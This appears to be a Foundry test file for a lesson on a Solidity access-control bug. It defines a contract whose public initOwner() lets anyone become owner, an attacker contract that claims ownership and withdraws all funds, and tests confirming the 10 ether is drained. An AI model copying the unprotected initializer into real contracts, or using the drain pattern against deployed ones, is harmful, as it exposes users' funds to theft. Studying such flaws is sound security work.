pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import the vulnerable contracts
// Assuming the vulnerable contracts are in the same directory/file structure
// Alternatively, you can include the contract code inline if needed

// SPDX-License-Identifier: MIT

// Vulnerable contract as provided

contract Missing {
    // Note: owner is not properly initialized in a constructor
    address payable private owner;

    // Public initialization function, can be called by anyone!
    function initOwner() public {
        owner = payable(msg.sender);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Allow contract to receive Ether
    receive() external payable {}

    // Only owner can withdraw funds from this contract
    function withdraw() public onlyowner {
        owner.transfer(address(this).balance);
    }
}

// Attacker contract that exploits the vulnerability
contract Attack {
    Missing public target;

    constructor(address payable _target) {
        target = Missing(_target);
    }

    // Attack function: claim ownership and withdraw funds
    function attack() external {
        target.initOwner();
        target.withdraw();
    }

    // Allow attack contract to receive Ether
    receive() external payable {}
}


contract MissingTest is Test {
    Missing public target;
    Attack public attack;

    // Attacker address for testing
    address public attacker = address(0xBEEF);

    // Set up the contracts for each test
    function setUp() public {
        // Deploy the vulnerable contract
        target = new Missing();
        
        // Fund the target contract with 10 ether to simulate funds that could be stolen
        // vm.deal sets an address balance to a given amount
        vm.deal(address(target), 10 ether);
        
        // Deploy the Attack contract from the attacker address
        vm.prank(attacker);
        attack = new Attack(payable(address(target)));
    }

    // Test to show that withdraw() fails if a caller is not the owner
    function testWithdrawRevertForNonOwner() public {
        // Without calling initOwner(), the owner remains unset (address(0)).
        // So when any non zero address (like attacker) calls withdraw(), it should revert.
        vm.prank(attacker);
        vm.expectRevert(bytes("Not owner"));
        target.withdraw();
    }

    // Test the exploit using the Attack contract
    function testExploitWithAttackContract() public {
        // Record the initial balance of the vulnerable contract
        uint256 targetBalance = address(target).balance;
        assertEq(targetBalance, 10 ether, "Target should have 10 ether initially");

        // Attack contract calls attack() from the attacker address, claiming ownership and withdrawing funds
        vm.prank(attacker);
        attack.attack();

        // Check that the funds have been withdrawn from target
        assertEq(address(target).balance, 0, "Target contract should be drained");

        // Verify that the funds are now in the attack contract
        assertEq(address(attack).balance, targetBalance, "Attacker should have received the drained funds");
    }
}
